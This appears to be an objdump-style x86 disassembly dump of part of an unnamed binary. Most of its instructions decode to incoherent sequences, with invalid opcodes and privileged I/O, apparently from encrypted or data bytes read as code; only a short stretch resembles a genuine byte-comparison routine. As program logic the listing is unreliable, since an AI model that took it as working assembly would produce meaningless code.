  4145cf:	test   BYTE PTR [ebx+0x26bc1f5a],0x72
  4145d6:	pusha  
  4145d7:	add    esp,DWORD PTR [esi-0xb8eac73]
  4145dd:	fwait
  4145de:	mov    dl,0x72
  4145e0:	je     0x4145f7
  4145e2:	aaa    
  4145e3:	mov    edx,0xc285e5e4
  4145e8:	add    eax,0x3b585624
  4145ed:	inc    ecx
  4145ee:	and    al,0x73
  4145f0:	sub    al,0xdd
  4145f2:	or     BYTE PTR [eax-0xc],ah
  4145f5:	cmp    BYTE PTR [ebp+0x3d],ah
  4145f8:	inc    edi
  4145f9:	aaa    
  4145fa:	out    dx,eax
  4145fb:	adc    dl,BYTE PTR [ebp-0x668befc4]
  414601:	loop   0x4145f5
  414603:	jle    0x41460b
  414605:	fimul  DWORD PTR [edx]
  414607:	gs pop es
  414609:	outs   dx,BYTE PTR ds:[esi]
  41460a:	(bad)  
  41460b:	fist   WORD PTR [ecx]
  41460d:	test   al,0x54
  41460f:	add    DWORD PTR [ebx+eiz*1],edx
  414612:	or     ebx,0xcf7f02f8
  414618:	adc    ecx,DWORD PTR ss:[ecx+ebp*4-0x418b76e]
  414620:	pop    es
  414621:	jnp    0x4145d0
  414623:	xchg   esi,eax
  414624:	lea    esp,[edi-0xbfa3716]
  41462a:	sbb    edx,DWORD PTR [eax-0x19abc7d6]
  414630:	cmp    edx,DWORD PTR [edi]
  414632:	add    ah,0xd
  414635:	pop    ecx
  414636:	xor    DWORD PTR [ebp+edx*2+0x6e],ebp
  41463a:	rcr    DWORD PTR [ecx-0x46],0xc0
  41463e:	bound  edi,QWORD PTR [ecx+0x30fd3f7f]
  414644:	and    al,BYTE PTR [ebx-0x1c84865b]
  41464a:	cmp    bl,BYTE PTR [ecx-0x15]
  41464d:	js     0x414606
  41464f:	jmp    0x4145e2
  414651:	sub    ah,BYTE PTR [eax+0x29d26872]
  414657:	lds    eax,FWORD PTR [ecx-0x37]
  41465a:	test   BYTE PTR [ebx],bh
  41465c:	rcr    BYTE PTR [ecx+edx*1],1
  41465f:	fisttp WORD PTR [esi-0x47]
  414662:	pushf  
  414663:	daa    
  414664:	and    al,0x95
  414666:	sub    esi,0x802112e3
  41466c:	push   0x7f15a55a
  414671:	sti    
  414672:	call   DWORD PTR [eax]
  414674:	aad    0xb9
  414676:	add    eax,0xc844a546
  41467b:	idiv   dh
  41467d:	jle    0x4146d7
  41467f:	push   esi
  414680:	or     edi,DWORD PTR [ebx-0x5f6708fa]
  414686:	cld    
  414687:	cmc    
  414688:	(bad)  
  414689:	sbb    eax,0xdb7d8ffe
  41468e:	mov    eax,0xdae2af49
  414693:	(bad)  
  414695:	xor    BYTE PTR [ebx-0x37753037],dh
  41469b:	mov    edx,0xb08b6d60
  4146a0:	mov    eax,0xff7935e5
  4146a5:	aas    
  4146a6:	jno    0x414701
  4146a8:	xchg   DWORD PTR [edi],ebx
  4146aa:	test   DWORD PTR [edx],ebx
  4146ac:	fs and eax,0x387d73d5
  4146b2:	data16 mov dh,0xbf
  4146b5:	add    eax,0x5763a495
  4146ba:	push   eax
  4146bb:	shl    BYTE PTR [eax-0x17],cl
  4146be:	inc    esp
  4146bf:	xchg   ebp,eax
  4146c0:	(bad)  
  4146c1:	mov    ch,0x39
  4146c3:	call   0x19b82e81
  4146c8:	hlt    
  4146c9:	ds gs pop ebx
  4146cc:	pop    eax
  4146cd:	cmp    ebp,DWORD PTR [esi+0x341bebde]
  4146d3:	sbb    al,0x20
  4146d5:	inc    ecx
  4146d6:	ret    
  4146d7:	sub    esp,DWORD PTR [eax+0x94e2724]
  4146dd:	xchg   BYTE PTR [ebp+0x7e],bl
  4146e0:	cmp    eax,0x85273557
  4146e5:	push   ebx
  4146e6:	ror    BYTE PTR [eax+0x16b12075],cl
  4146ec:	loope  0x41468b
  4146ee:	sub    BYTE PTR [ebx],ch
  4146f0:	into   
  4146f1:	call   0x8ecd:0x923a900a
  4146f8:	cmp    eax,0xcdeecd3b
  4146fd:	ror    ebx,cl
  4146ff:	aam    0xb0
  414701:	sbb    al,0xb8
  414703:	adc    ah,dh
  414705:	pop    ss
  414706:	(bad)  
  414708:	fbstp  TBYTE PTR [ebp+0x5e]
  41470b:	pop    edx
  41470c:	scas   al,BYTE PTR es:[edi]
  41470d:	xchg   edi,eax
  41470e:	fiadd  DWORD PTR [ecx-0x3a]
  414711:	or     dl,BYTE PTR [eax-0x7f]
  414714:	addr16 sti 
  414716:	mov    ds:0xa367e58,eax
  41471b:	in     eax,0x6e
  41471d:	pop    ds
  41471e:	inc    eax
  41471f:	add    bh,cl
  414721:	mov    ebp,0xb394fc89
  414726:	cdq    
  414727:	dec    esi
  414728:	sahf   
  414729:	fcomp  QWORD PTR [ecx-0xf6648a0]
  41472f:	xor    DWORD PTR gs:[eax],0xffffff8c
  414733:	out    dx,al
  414734:	cmp    dl,BYTE PTR [ebp+0x705ac780]
  41473a:	mov    es,WORD PTR [ecx-0x33423c01]
  414740:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414741:	cs mov eax,0x76d1c2f6
  414747:	lahf   
  414748:	xchg   edx,eax
  414749:	mov    cl,0x5d
  41474b:	sti    
  41474c:	adc    BYTE PTR [edi+0x1f],bl
  41474f:	xor    al,0xb1
  414751:	sbb    DWORD PTR [ecx-0x1e],0xd2f2b53c
  414758:	pop    edi
  414759:	dec    ebp
  41475a:	mov    dl,0x71
  41475c:	sub    ch,BYTE PTR [ebp-0x78]
  41475f:	cli    
  414760:	jmp    0x4147b3
  414762:	iret   
  414763:	aaa    
  414764:	push   ds
  414765:	xchg   ecx,eax
  414766:	pop    ecx
  414767:	lods   al,BYTE PTR ds:[esi]
  414768:	or     ecx,edx
  41476a:	push   ecx
  41476b:	dec    edx
  41476c:	(bad)  [ecx+ebp*8+0x48f880b]
  414773:	xchg   esp,eax
  414774:	or     dl,BYTE PTR [esi-0x7a97b90]
  41477a:	pop    edi
  41477b:	inc    ebp
  41477c:	inc    ecx
  41477d:	cmp    bh,BYTE PTR [ebp+0x2c]
  414780:	pop    ds
  414781:	or     cl,BYTE PTR [esi+0x79b2ace1]
  414787:	cs jo  0x4147ec
  41478a:	lods   eax,DWORD PTR ds:[esi]
  41478b:	stos   DWORD PTR es:[edi],eax
  41478c:	int    0x20
  41478e:	mov    cl,BYTE PTR [ecx+eiz*4-0x3f]
  414792:	icebp  
  414793:	xchg   ebx,eax
  414794:	stos   BYTE PTR es:[edi],al
  414795:	pushf  
  414796:	jo     0x414762
  414798:	es pop ss
  41479a:	in     al,dx
  41479b:	pop    ebx
  41479c:	(bad)  
  41479d:	jl     0x4147c1
  41479f:	ret    0x14d7
  4147a2:	dec    ecx
  4147a3:	dec    ebx
  4147a4:	xor    dl,dl
  4147a6:	jbe    0x41477b
  4147a8:	cwde   
  4147a9:	xlat   BYTE PTR ds:[ebx]
  4147aa:	xchg   edx,eax
  4147ab:	pop    edx
  4147ac:	pop    ds
  4147ad:	in     al,0x34
  4147af:	sub    bl,BYTE PTR [ebp-0x76]
  4147b2:	psraw  mm2,QWORD PTR [esi-0x1a]
  4147b6:	sbb    ah,ch
  4147b8:	mov    DWORD PTR [edx+0x30],ebp
  4147bb:	outs   dx,BYTE PTR ds:[esi]
  4147bc:	out    dx,eax
  4147bd:	dec    esp
  4147be:	out    dx,eax
  4147bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147c0:	xchg   BYTE PTR [ebp-0x1c],dl
  4147c3:	push   esi
  4147c4:	cmp    dl,BYTE PTR ds:0x54a1e70b
  4147ca:	dec    edx
  4147cb:	or     edi,DWORD PTR [ecx-0xd9c40b6]
  4147d1:	das    
  4147d2:	add    ah,BYTE PTR [esi+edx*4-0x7b02bc14]
  4147d9:	imul   ecx,DWORD PTR [esi-0x52761fe7],0x65d2f90c
  4147e3:	adc    DWORD PTR [edx+0x44a1e362],ebp
  4147e9:	into   
  4147ea:	cwde   
  4147eb:	push   es
  4147ec:	jge    0x4147f5
  4147ee:	test   al,0x3b
  4147f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147f1:	fidivr WORD PTR [edx+0x463e9846]
  4147f7:	iret   
  4147f8:	nop
  4147f9:	xor    ah,bh
  4147fb:	xchg   edi,eax
  4147fc:	out    0x31,eax
  4147fe:	jmp    0x8341a7a8
  414803:	rcl    BYTE PTR [esi-0x3ca5c2f0],1
  414809:	and    al,0x52
  41480b:	and    edx,DWORD PTR [ecx-0x7e]
  41480e:	jmp    FWORD PTR [eax-0x65]
  414811:	out    0xe3,eax
  414813:	or     al,0xb6
  414815:	aad    0xd6
  414817:	cmp    al,0xac
  414819:	rcr    DWORD PTR [ecx+ecx*8-0x4f],1
  41481d:	cld    
  41481e:	mov    DWORD PTR ds:0x5199b6ef,ebp
  414824:	cmp    DWORD PTR [esi+edi*4],edx
  414827:	jmp    0x414884
  414829:	mov    dh,BYTE PTR [eax]
  41482b:	sbb    ch,BYTE PTR [bx]
  41482e:	inc    ebp
  41482f:	nop
  414830:	pop    es
  414831:	sbb    ebx,esi
  414833:	fwait
  414834:	jmp    0x4147d5
  414836:	pop    edi
  414837:	cwde   
  414838:	daa    
  414839:	adc    eax,0xaff264c0
  41483e:	inc    esi
  41483f:	push   ebp
  414840:	jp     0x4147c6
  414842:	in     al,dx
  414843:	xchg   edx,eax
  414844:	xchg   edi,eax
  414845:	add    BYTE PTR [edx],ch
  414847:	mov    bh,0xe7
  414849:	outs   dx,DWORD PTR ds:[esi]
  41484a:	fsubrp st(7),st
  41484c:	jb     0x41487e
  41484e:	aaa    
  41484f:	xchg   ecx,eax
  414850:	rol    BYTE PTR gs:[ebx+edx*1-0x47c41f19],0x19
  414859:	outs   dx,DWORD PTR ds:[esi]
  41485a:	xlat   BYTE PTR ds:[ebx]
  41485b:	repz pop ebx
  41485d:	dec    edx
  41485e:	xor    bh,BYTE PTR [esi]
  414860:	mov    al,ds:0xd4973141
  414865:	mov    edi,fs
  414867:	not    BYTE PTR [eax+0x13]
  41486a:	in     eax,dx
  41486b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41486c:	scas   al,BYTE PTR es:[edi]
  41486d:	mov    cs,WORD PTR [eax]
  41486f:	xor    BYTE PTR [esi],cl
  414871:	inc    eax
  414872:	xchg   ebp,ebx
  414874:	bound  edx,QWORD PTR [edx]
  414876:	nop
  414877:	pop    edx
  414878:	inc    ebp
  414879:	push   cs
  41487a:	jns    0x414854
  41487c:	loopne 0x4148d1
  41487e:	ficomp DWORD PTR [edi-0x192866c2]
  414884:	out    0x26,eax
  414886:	popa   
  414887:	or     dl,BYTE PTR [ebx]
  414889:	jno    0x414882
  41488b:	xchg   edi,eax
  41488d:	jge    0x41490e
  41488f:	dec    ebx
  414890:	ss ds push ds
  414893:	sub    ecx,DWORD PTR [eax+eiz*2]
  414896:	cmp    cl,ch
  414898:	adc    dl,BYTE PTR [esi+0x6189197a]
  41489e:	rcpps  xmm3,xmm5
  4148a1:	ret    
  4148a2:	fwait
  4148a3:	into   
  4148a4:	js     0x414903
  4148a6:	retf   0xc727
  4148a9:	jl     0x41482f
  4148ab:	es fdivp st(1),st
  4148ae:	lods   eax,DWORD PTR ds:[esi]
  4148af:	xchg   esp,eax
  4148b0:	xor    al,0x87
  4148b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148b3:	jnp    0x4148f8
  4148b5:	div    BYTE PTR [edi+esi*1+0x77]
  4148b9:	cli    
  4148ba:	arpl   WORD PTR [edx-0x37],bx
  4148bd:	mov    dh,BYTE PTR [eax]
  4148bf:	jl     0x414895
  4148c1:	bound  eax,QWORD PTR ds:0x5d70714a
  4148c7:	lock xchg esi,eax
  4148c9:	or     bl,0xe6
  4148cc:	mov    edi,ebp
  4148ce:	ret    
  4148cf:	jl     0x414878
  4148d1:	outs   dx,BYTE PTR ds:[esi]
  4148d2:	add    eax,0x76e77461
  4148d7:	dec    ebp
  4148d8:	push   edi
  4148d9:	xchg   dl,al
  4148db:	dec    eax
  4148dc:	inc    edx
  4148dd:	shl    BYTE PTR [edi],cl
  4148df:	pop    edx
  4148e0:	(bad)  
  4148e2:	in     al,dx
  4148e3:	xor    eax,0xb23b4357
  4148e8:	push   ds
  4148e9:	mov    esp,ebp
  4148eb:	adc    al,0xa5
  4148ed:	pushf  
  4148ee:	add    al,cl
  4148f0:	ret    0x3ac8
  4148f3:	outs   dx,BYTE PTR ds:[esi]
  4148f4:	test   eax,0xfba03d33
  4148f9:	outs   dx,BYTE PTR ds:[esi]
  4148fa:	inc    ebx
  4148fb:	aam    0x73
  4148fd:	aas    
  4148fe:	loope  0x4148c2
  414900:	shr    DWORD PTR [ecx-0x71],1
  414903:	pop    esp
  414904:	xor    DWORD PTR [eax],esi
  414906:	dec    esi
  414907:	push   ebp
  414908:	cmp    ebp,DWORD PTR [edi-0x55]
  41490b:	sbb    BYTE PTR [ebx+eiz*1-0x37],ch
  41490f:	adc    ecx,DWORD PTR [ebx-0x6b750bab]
  414915:	adc    eax,0xffffff64
  41491a:	mov    bl,BYTE PTR [ebp-0x1]
  41491d:	cmp    dl,bl
  41491f:	je     0x416d50
  414925:	mov    ecx,DWORD PTR [ebp-0x5c]
  414928:	mov    edx,DWORD PTR [ebp-0xc]
  41492b:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  414932:	mov    ebx,DWORD PTR [ebp+0xc]
  414935:	xor    ecx,eax
  414937:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272fa]
  41493e:	jne    0x416e84
  414944:	mov    ecx,DWORD PTR [ebp-0x5c]
  414947:	mov    edx,DWORD PTR [ebp+0xc]
  41494a:	xor    ecx,eax
  41494c:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272fa]
  414954:	mov    edx,DWORD PTR [ebp-0x18]
  414957:	xor    edx,eax
  414959:	add    edx,esi
  41495b:	cmp    ecx,edx
  41495d:	mov    ecx,DWORD PTR [ebp-0x14]
  414960:	mov    DWORD PTR [ebp+0x8],ecx
  414963:	mov    ecx,DWORD PTR [ebp+0x8]
  414966:	je     0x416f8c
  41496c:	xor    ecx,eax
  41496e:	add    ecx,esi
  414970:	mov    ecx,0xf641bea
  414975:	je     0x416dd8
  41497b:	mov    edx,DWORD PTR [ebp+0x8]
  41497e:	jmp    0x416cd1
  414983:	outs   dx,DWORD PTR ds:[esi]
  414984:	sub    edi,DWORD PTR [ebx]
  414986:	xchg   BYTE PTR [edi],bh
  414988:	div    BYTE PTR [esi+0x72]
  41498b:	daa    
  41498c:	mov    dl,0xdf
  41498e:	mov    al,BYTE PTR [edi+esi*2-0x6bb1dbe5]
  414995:	jp     0x414a12
  414997:	mov    cl,0x9c
  414999:	jnp    0x414a16
  41499b:	retf   0xc4a3
  41499e:	ret    0xdf96
  4149a1:	int3   
  4149a2:	add    BYTE PTR [edi+0x3f],0xff
  4149a6:	pop    ss
  4149a7:	or     esi,DWORD PTR [esi]
  4149a9:	les    esp,FWORD PTR [edx-0x63829a9]
  4149af:	fscale 
  4149b1:	sbb    DWORD PTR [eax-0x33],0xc58c5b59
  4149b8:	add    dl,BYTE PTR [edi+0x7b]
  4149bb:	mov    ebp,0xb38ddc4
  4149c0:	repz into 
  4149c2:	jle    0x4149ec
  4149c4:	jns    0x414a07
  4149c6:	cli    
  4149c7:	pusha  
  4149c8:	xchg   esp,ecx
  4149ca:	mov    al,BYTE PTR [edi-0x1ad67b42]
  4149d0:	cdq    
  4149d1:	not    DWORD PTR [eax-0x6b]
  4149d4:	push   es
  4149d5:	jle    0x4149ca
  4149d7:	inc    esi
  4149d8:	leavew 
  4149da:	or     DWORD PTR [ebp+0x387d1eb2],0x55185a3c
  4149e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149e5:	fucomp st(6)
  4149e7:	les    ecx,FWORD PTR [esi-0x4d]
  4149ea:	jb     0x41497a
  4149ec:	(bad)  
  4149ee:	adc    bh,ah
  4149f0:	dec    ebp
  4149f1:	enter  0xd403,0xf0
  4149f5:	sbb    BYTE PTR [ebp+0xd493ce9],ah
  4149fb:	and    dl,BYTE PTR [edx+0x4b]
  4149fe:	mov    ecx,0xd8c76d4f
  414a03:	ficomp DWORD PTR ds:0xd1123689
  414a09:	xor    BYTE PTR [esi],ah
  414a0b:	lock push ds
  414a0d:	test   esi,edx
  414a0f:	inc    ecx
  414a10:	pop    ecx
  414a11:	popa   
  414a12:	mov    bl,0x14
  414a14:	(bad)  
  414a15:	pop    ebp
  414a16:	pop    ecx
  414a17:	pop    ebp
  414a18:	mov    edi,DWORD PTR [edx-0x2bc0ed78]
  414a1e:	inc    edx
  414a1f:	in     eax,0x33
  414a21:	jmp    0x26ce:0x54fff666
  414a28:	cmp    ebp,0x59
  414a2b:	xchg   DWORD PTR [esi+0x13],ecx
  414a2e:	test   BYTE PTR [ecx+0x26],0x7
  414a32:	and    bh,BYTE PTR [ecx+0x56]
  414a35:	inc    ecx
  414a36:	jae    0x4149e7
  414a38:	stos   BYTE PTR es:[edi],al
  414a39:	push   ecx
  414a3a:	fwait
  414a3b:	lods   eax,DWORD PTR fs:[esi]
  414a3d:	ins    WORD PTR es:[edi],dx
  414a3f:	or     DWORD PTR [edx],ecx
  414a41:	stc    
  414a42:	xchg   ebp,eax
  414a43:	jns    0x414a58
  414a45:	vsqrtss xmm4,xmm6,DWORD PTR [ebp-0x3da0dbf7]
  414a4d:	sbb    eax,0xf8e0cdc
  414a52:	jae    0x414a36
  414a54:	loope  0x4149f2
  414a56:	mov    dh,0x90
  414a58:	sar    DWORD PTR [edi],0x4f
  414a5b:	addr16 int 0xde
  414a5e:	sub    al,0xdc
  414a60:	jne    0x414a55
  414a62:	xor    DWORD PTR [esi-0x7ef75acd],esp
  414a68:	xchg   edx,eax
  414a69:	lea    ebp,[ebx-0x1c50a245]
  414a6f:	aad    0x3
  414a71:	cmc    
  414a72:	mov    esi,0xfc6f3367
  414a77:	test   ebp,ecx
  414a79:	dec    edx
  414a7a:	add    BYTE PTR [esi+0x7cda4703],ah
  414a80:	push   0xffffff8a
  414a82:	inc    edx
  414a83:	jmp    0x414ac9
  414a85:	lds    esi,FWORD PTR [edi]
  414a87:	add    bl,BYTE PTR [ebp+0x566b6e06]
  414a8d:	xchg   ebp,eax
  414a8e:	mov    BYTE PTR [eax-0x78],bl
  414a91:	push   ebx
  414a92:	adc    eax,0x1d3d53b2
  414a97:	mov    BYTE PTR [edi],dh
  414a99:	(bad)  
  414a9b:	mov    edx,0x273dc485
  414aa0:	mov    ch,0x28
  414aa2:	cmp    eax,0x75c37693
  414aa7:	imul   edx,DWORD PTR [ecx+0x47],0xffffffbb
  414aab:	test   al,0xea
  414aad:	or     DWORD PTR [ecx],edi
  414aaf:	dec    edx
  414ab0:	inc    edi
  414ab1:	pop    ebp
  414ab2:	fst    QWORD PTR [edi+edx*8]
  414ab5:	sub    dh,BYTE PTR [esi+eax*8]
  414ab8:	sbb    ebp,ecx
  414aba:	imul   ecx,DWORD PTR [edx],0x74
  414abd:	mov    esp,0xbd438116
  414ac2:	ss push edi
  414ac4:	dec    ecx
  414ac5:	lahf   
  414ac6:	jmp    FWORD PTR [edx-0x6dcab71f]
  414acc:	shl    BYTE PTR [ecx-0x439e46e4],cl
  414ad2:	hlt    
  414ad3:	pop    ecx
  414ad4:	lds    ecx,FWORD PTR [eax]
  414ad6:	aas    
  414ad7:	push   edi
  414ad8:	or     BYTE PTR [edi+eiz*1-0x76],0x2
  414add:	mov    al,0x5a
  414adf:	xor    BYTE PTR [ebx+0x79],0xa3
  414ae3:	stc    
  414ae4:	repz ja 0x414add
  414ae7:	xchg   DWORD PTR [ecx],ecx
  414ae9:	mov    edx,0xcd55dcd0
  414aee:	sub    eax,edx
  414af0:	cmp    BYTE PTR [esi-0x13],al
  414af3:	call   0xffcb:0xa98d4cca
  414afa:	aaa    
  414afb:	popa   
  414afc:	inc    edx
  414afd:	sbb    al,BYTE PTR [edx-0x6d231976]
  414b03:	test   eax,0x16655671
  414b08:	popf   
  414b09:	sahf   
  414b0a:	push   edi
  414b0b:	mov    ds:0x4c876366,eax
  414b10:	cmp    cl,BYTE PTR [ecx]
  414b12:	push   esp
  414b13:	shld   DWORD PTR [eax-0x69],edi,cl
  414b17:	cmp    eax,0xa9f50e4
  414b1c:	mov    dl,0xd
  414b1e:	sbb    BYTE PTR [ebx],dh
  414b20:	je     0x414b12
  414b22:	push   0xa439152c
  414b27:	push   ss
  414b28:	fs dec ebp
  414b2a:	pop    ds
  414b2b:	xchg   BYTE PTR [eax-0x37],bh
  414b2e:	mov    dh,BYTE PTR [ebx+0xf98a3a7]
  414b34:	adc    edi,DWORD PTR [esi+0x2d68433a]
  414b3a:	push   esp
  414b3b:	cmp    cl,0x44
  414b3e:	adc    al,0x15
  414b40:	sub    BYTE PTR [esi-0x7e],dh
  414b43:	adc    al,0x8
  414b45:	repz sub ah,0xb2
  414b49:	and    eax,0x140a1d18
  414b4e:	sub    BYTE PTR [ebp+esi*1+0x794b2385],bl
  414b55:	mov    bl,bl
  414b57:	stos   DWORD PTR es:[edi],eax
  414b58:	sbb    ch,BYTE PTR [edi+0xc]
  414b5b:	sbb    eax,0xd8936832
  414b60:	adc    eax,0xf5e9f55f
  414b65:	add    dl,ch
  414b67:	sub    BYTE PTR ds:0x1c3c6d62,ch
  414b6d:	mov    al,0x41
  414b6f:	aas    
  414b70:	nop
  414b71:	and    DWORD PTR [ebp+0x39adc80],edi
  414b77:	cli    
  414b78:	loop   0x414bba
  414b7a:	mov    bh,0x13
  414b7c:	iret   
  414b7d:	ins    BYTE PTR es:[edi],dx
  414b7e:	push   ebx
  414b7f:	cmp    eax,0x293e4333
  414b84:	jnp    0x414c05
  414b86:	fxch   st(1)
  414b88:	xchg   edi,eax
  414b89:	sub    eax,0x8d0f8f7c
  414b8e:	mov    al,ds:0xb836f1fd
  414b93:	xor    dl,BYTE PTR [edi]
  414b95:	std    
  414b96:	jno    0x414b8e
  414b98:	or     eax,0x2fc60320
  414b9d:	fmul   DWORD PTR [ecx+0x37618730]
  414ba3:	cmp    cl,BYTE PTR ds:0xf8d662a8
  414ba9:	(bad)  
  414bad:	dec    ebp
  414bae:	mov    eax,ds:0xc2b15922
  414bb3:	pusha  
  414bb4:	(bad)  
  414bb5:	lea    ecx,ds:0xb4ee77c3
  414bbb:	imul   ecx,DWORD PTR [eax+0x32e47519],0x373afc70
  414bc5:	sar    esi,1
  414bc7:	xor    bl,0xdb
  414bca:	fcom   st(5)
  414bcc:	outs   dx,DWORD PTR ds:[esi]
  414bcd:	xchg   BYTE PTR ds:0xa6d9865,ch
  414bd3:	ror    BYTE PTR [ebx-0x3de4db32],cl
  414bd9:	addr16 push eax
  414bdb:	inc    eax
  414bdc:	ficom  WORD PTR [eax-0x19]
  414bdf:	jne    0x414c0d
  414be1:	pushf  
  414be2:	ficomp WORD PTR [ebp-0x2b112536]
  414be8:	jnp    0x414bcd
  414bea:	mov    edx,0xdcdec8cc
  414bef:	in     eax,dx
  414bf0:	xchg   ecx,eax
  414bf1:	mov    al,ds:0x3b9a0e4f
  414bf6:	call   0x1ff9:0x2696d095
  414bfd:	rol    BYTE PTR [eax+0x434789af],cl
  414c03:	adc    DWORD PTR [eax],edi
  414c05:	retf   
  414c06:	and    al,0xa0
  414c08:	pop    ss
  414c09:	mov    WORD PTR [esi+0x3d7354fa],?
  414c0f:	outs   dx,DWORD PTR ds:[esi]
  414c10:	int    0x48
  414c12:	jb     0x414bea
  414c14:	aas    
  414c15:	jae    0x414c31
  414c17:	fstp   QWORD PTR [ecx+0x2a]
  414c1a:	mov    ch,0xcb
  414c1c:	and    al,0xfa
  414c1e:	push   esi
  414c1f:	stos   DWORD PTR es:[edi],eax
  414c20:	ja     0x414bdc
  414c22:	jae    0x414c5c
  414c24:	xor    ah,BYTE PTR [esi]
  414c26:	cwde   
  414c27:	inc    DWORD PTR [eax]
  414c29:	xor    eax,0x7dca1872
  414c2e:	mov    esi,0x7ebc2bb9
  414c33:	push   ebx
  414c34:	imul   eax,DWORD PTR [edi],0x3cf32bf7
  414c3a:	ds jp  0x414bd8
  414c3d:	imul   ecx,edi,0xffffff9b
  414c40:	adc    al,0x2e
  414c42:	or     ebp,esi
  414c44:	pop    eax
  414c45:	std    
  414c46:	mov    al,0xbb
  414c48:	dec    ebp
  414c49:	push   0x347c86fe
  414c4e:	inc    edx
  414c4f:	test   BYTE PTR [ebp-0x3d809e75],0x4e
  414c56:	adc    edi,DWORD PTR [ebp+ebx*2-0x14]
  414c5a:	mov    esi,0x4e10844e
  414c5f:	and    edi,DWORD PTR ds:0x86b385af
  414c65:	lds    ebp,FWORD PTR [ebp-0x44]
  414c68:	mov    eax,ds:0x12007d90
  414c6d:	rol    DWORD PTR [esi+0x72],0xda
  414c71:	popa   
  414c72:	push   eax
  414c73:	add    ecx,DWORD PTR [edi]
  414c75:	fcomp  QWORD PTR [ebx-0x7a]
  414c78:	pop    es
  414c79:	repz sbb dl,BYTE PTR [edi+ebx*2]
  414c7d:	and    al,0xab
  414c7f:	pusha  
  414c80:	inc    ecx
  414c81:	adc    BYTE PTR [edi-0x2a36924f],0x2b
  414c88:	mov    cs,WORD PTR [ebx]
  414c8a:	xchg   ebx,eax
  414c8b:	cld    
  414c8c:	lahf   
  414c8d:	aas    
  414c8e:	push   esp
  414c8f:	mov    eax,0xec079de1
  414c94:	mov    ds:0xb8a00e45,al
  414c99:	or     ecx,DWORD PTR [ecx]
  414c9b:	inc    ebp
  414c9c:	mov    bh,0x15
  414c9e:	das    
  414c9f:	in     al,0x83
  414ca1:	in     eax,dx
  414ca2:	add    DWORD PTR [ebx-0x8],0x3d
  414ca6:	mov    ebp,0xa02297c5
  414cab:	in     eax,dx
  414cac:	inc    esi
  414cad:	mov    esp,DWORD PTR [ebx+0x9]
  414cb0:	dec    ebx
  414cb1:	xor    al,0x8f
  414cb3:	mov    eax,ds:0x184d6025
  414cb8:	cmp    DWORD PTR [eax-0x71f02481],esi
  414cbe:	and    ch,BYTE PTR [eax]
  414cc0:	fnstenv [esi-0x3c3fb8e3]
  414cc6:	adc    DWORD PTR [ebx+0x7b],ebx
  414cc9:	aad    0xb
  414ccb:	sbb    eax,DWORD PTR [ebp-0x4a]
  414cce:	mov    edx,0xd383153a
  414cd3:	sar    BYTE PTR [esi+eax*8+0x56268716],0xc
  414cdb:	ret    0x38e2
  414cde:	jge    0x414c6f
  414ce0:	and    dl,BYTE PTR ds:0xea58f63d
  414ce6:	xchg   ebx,eax
  414ce7:	inc    ecx
  414ce8:	or     ebx,ecx
  414cea:	mov    dl,0xb8
  414cec:	in     eax,0x1f
  414cee:	cmp    DWORD PTR [edi+0x2eaf2ec8],edx
  414cf4:	leave  
  414cf5:	gs std 
  414cf7:	fimul  DWORD PTR [eax-0x1854769a]
  414cfd:	outs   dx,BYTE PTR ds:[esi]
  414cfe:	out    dx,eax
  414cff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d00:	in     eax,0xfd
  414d02:	fs jp  0x414d6d
  414d05:	sbb    edx,eax
  414d07:	fnstcw WORD PTR ds:0xb7363467
  414d0d:	mov    ecx,0x3d9ca1cd
  414d12:	sub    al,0xcb
  414d14:	pop    eax
  414d15:	push   edi
  414d16:	shl    DWORD PTR [edx-0xb],0x7b
  414d1a:	inc    eax
  414d1b:	bound  esi,QWORD PTR [eax+0x49]
  414d1e:	cmp    ebp,DWORD PTR [edi-0x790c9e9c]
  414d24:	sub    eax,0xc62cedb1
  414d29:	ror    DWORD PTR [ebx+0x9d27e3f],cl
  414d2f:	pop    edx
  414d30:	mov    ss,WORD PTR [esi+0x3b]
  414d33:	fild   DWORD PTR [edi+0x4251cddb]
  414d39:	outs   dx,BYTE PTR ds:[esi]
  414d3a:	add    DWORD PTR ds:0x556a5d2e,esp
  414d40:	jl     0x414ccc
  414d42:	popa   
  414d43:	mul    al
  414d45:	neg    DWORD PTR [edi-0x40cffbed]
  414d4b:	push   edx
  414d4c:	push   0xf1eea648
  414d51:	lsl    eax,WORD PTR [edx+0x6c]
  414d55:	ins    DWORD PTR es:[edi],dx
  414d56:	pop    esp
  414d57:	xchg   edi,eax
  414d58:	xchg   esi,eax
  414d59:	cmc    
  414d5a:	fwait
  414d5b:	stc    
  414d5c:	mov    eax,ds:0x46d8b88
  414d61:	mov    eax,0x1121067c
  414d66:	xor    al,0x6c
  414d68:	pop    edi
  414d69:	xchg   edx,eax
  414d6a:	mov    al,0x5f
  414d6c:	sbb    al,0xe5
  414d6e:	popa   
  414d6f:	outs   dx,DWORD PTR ds:[esi]
  414d70:	adc    DWORD PTR [ecx+0xe],ebx
  414d73:	cli    
  414d74:	xlat   BYTE PTR ds:[ebx]
  414d75:	add    al,0x9c
  414d77:	and    BYTE PTR [esi-0x6b],dh
  414d7a:	inc    edx
  414d7b:	pop    eax
  414d7c:	push   0xbcbfe3e7
  414d81:	add    ah,dl
  414d83:	mov    al,0xd7
  414d85:	mov    dl,BYTE PTR [ecx+eiz*4]
  414d88:	and    al,0x10
  414d8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d8b:	gs or  al,0x5a
  414d8e:	ficomp DWORD PTR [edx-0x52]
  414d91:	dec    esp
  414d92:	mov    bh,0x13
  414d94:	bound  ebx,QWORD PTR [ebp+eax*4+0x8]
  414d98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d99:	inc    esi
  414d9a:	xchg   al,ah
  414d9c:	lahf   
  414d9d:	(bad)  
  414d9e:	ins    DWORD PTR es:[edi],dx
  414d9f:	jecxz  0x414d51
  414da1:	cdq    
  414da2:	dec    ecx
  414da3:	ret    
  414da4:	add    al,0x4e
